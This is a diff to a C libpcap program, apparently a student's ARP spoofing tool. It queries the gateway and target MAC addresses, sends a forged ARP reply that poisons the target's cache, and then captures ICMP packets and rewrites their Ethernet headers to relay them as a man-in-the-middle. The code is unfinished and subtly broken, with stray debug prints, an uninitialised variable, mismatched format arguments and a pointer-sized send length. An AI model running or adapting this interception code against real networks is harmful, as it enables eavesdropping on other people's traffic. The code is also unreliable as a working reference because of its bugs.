@@ -35,12 +35,16 @@ int main(int argc, char ** argv) {
     pcap_t * handle;
     const char * buf;
     u_char packet[42];
+    u_char arp_packet[42];
     u_char errbuf[PCAP_ERRBUF_SIZE];
     u_int32_t res, i;
     struct pcap_pkthdr *header;	/* The header that pcap gives us */
     u_char* packet2;		/* The actual packet */
     u_char gatemac[6];
     u_char targetmac[6];
+    u_char filter_exp[] = "arp";
+    u_int32_t net;
+    struct bpf_program fp;
 
     if(argc != 4) {
         printf("Usage : ./send_arp [device] [sender ip] [target ip]");
@@ -76,9 +80,6 @@ int main(int argc, char ** argv) {
         packet[19] = 4;
         packet[20] = 0;
         packet[21] = 1; // ARP Request
-        for(i=22; i<28; i++) {
-            packet[i] = mac[i-22];
-        }
         packet[28] = (tipNum)&0xff;
         packet[29] = ((tipNum)>>8)&0xff;
         packet[30] = ((tipNum)>>16)&0xff;
@@ -89,17 +90,30 @@ int main(int argc, char ** argv) {
         packet[35] = 0;
         packet[36] = 0;
         packet[37] = 0;
-        packet[38] = (sipNum)&0xff;
-        packet[39] = ((sipNum)>>8)&0xff;
-        packet[40] = ((sipNum)>>16)&0xff;
-        packet[41] = ((sipNum)>>24)&0xff;
+        packet[38] = (tipNum)&0xff;
+        packet[39] = ((tipNum)>>8)&0xff;
+        packet[40] = ((tipNum)>>16)&0xff;
+        packet[41] = ((tipNum)>>24)&0xff;
 
         if (pcap_sendpacket(handle, packet, 42) != 0) {
             printf( "Couldn't send packet\n");
             return(2);
         }
+        printf("Hello\n");
+
+        if(pcap_compile(handle, &fp, "arp", 0, net) == -1) {
+            fprintf(stderr, "Couldn't parse filter %s\n", filter_exp, pcap_geterr(handle));
+            return (2);
+        }
+
+        if(pcap_setfilter(handle, &fp) == -1) {
+            fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
+            return(2);
+        }
+
         while(1) {
             res = pcap_next_ex(handle, &header, &packet2); // header : 패킷이 잡힌 시간, 길이 정보
+            printf("Hel");
             if (res == 0 || packet == NULL)
                 continue;
             if (res == -1 || res == -2) // Error while grabbing packet.
@@ -108,10 +122,11 @@ int main(int argc, char ** argv) {
             for(i=0; i<6; i++) {
                 gatemac[i] = packet2[i+6];
             }
+            for(i=0; i<6; i++) {
+                printf("%x ", gatemac[i]);
+            }
             break;
         }
-
-        packet[41] = ((tipNum)>>24)&0xff;
 
         if (pcap_sendpacket(handle, packet, 42) != 0) {
             printf( "Couldn't send packet\n");
@@ -126,6 +141,9 @@ int main(int argc, char ** argv) {
             printf("Jacked a packet with length of [%d]\n", (*header).len);
             for(i=0; i<6; i++) {
                 targetmac[i] = packet2[i+6];
+            }
+            for(i=0; i<6; i++) {
+                printf("%x ", targetmac[i]);
             }
             break;
         }
@@ -161,10 +179,50 @@ int main(int argc, char ** argv) {
         packet[40] = ((tipNum)>>16)&0xff;
         packet[41] = ((tipNum)>>24)&0xff;
 
+        memcpy(arp_packet, packet, sizeof(packet));
+/*
         while(1)
         {
-            if (pcap_sendpacket(handle, packet, sizeof( packet )) != 0)
+            if (pcap_sendpacket(handle, arp_packet, sizeof( arp_packet )) != 0)
                 printf("error\n");
+        }
+*/
+        if(pcap_sendpacket(handle, arp_packet, sizeof(arp_packet)) != 0 ) {
+            printf("Couldn't send packet\n");
+            return(2);
+        }
+
+        if(pcap_compile(handle, &fp, "icmp", 0, net) == -1) {
+            fprintf(stderr, "Couldn't parse filter %s\n", filter_exp, pcap_geterr(handle));
+            return (2);
+        }
+
+        if(pcap_setfilter(handle, &fp) == -1) {
+            fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
+            return(2);
+        }
+
+        while(1) {
+            res = pcap_next_ex(handle, &header, &packet2);
+            if( res == 0 || packet2 == NULL)
+                continue;
+            if( res ==-1 || res == -2)
+                break;
+            printf("Jacked a packet with length of [%d]\n", (*header).len);
+
+            for(i=0; i<6; i++) {
+                packet2[i] = gatemac[i];
+            }
+
+            for(i=0;i<6;i++) {
+                packet2[i+6] = mac[i];
+            }
+
+            if(pcap_sendpacket(handle, packet2, sizeof(packet2)) != 0 ) {
+                printf("Couldn't send packet\n");
+                return(2);
+            }
+            printf("Packet Relay\n");
         }
 
         return 0;
